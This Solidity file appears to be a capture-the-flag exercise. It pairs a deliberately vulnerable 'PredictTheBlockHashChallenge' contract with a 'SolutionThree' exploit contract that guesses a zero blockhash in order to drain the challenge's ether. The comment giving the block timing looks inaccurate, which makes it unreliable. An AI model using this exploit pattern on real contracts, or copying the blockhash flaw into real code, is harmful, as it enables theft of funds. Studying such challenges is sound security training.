// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.4.21;

contract PredictTheBlockHashChallenge {
    address guesser;
    bytes32 guess;
    uint256 settlementBlockNumber;

    function PredictTheBlockHashChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(bytes32 hash) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = hash;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        bytes32 answer = block.blockhash(settlementBlockNumber);

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract SolutionThree{

    bytes32 public blockNumber;
    PredictTheBlockHashChallenge public victim;
    function SolutionThree(PredictTheBlockHashChallenge _victim) public payable{
        victim = _victim;
    }

    //ex: call lockGuess() in block 1
    function lockGuess() public payable{
        victim.lockInGuess.value(1 ether)(bytes32(0));
    }

    //ex: call settle() in block 4, will pass the test.
    function settle() public{
        victim.settle();
        require(victim.isComplete());
    }

    function() public payable{}
}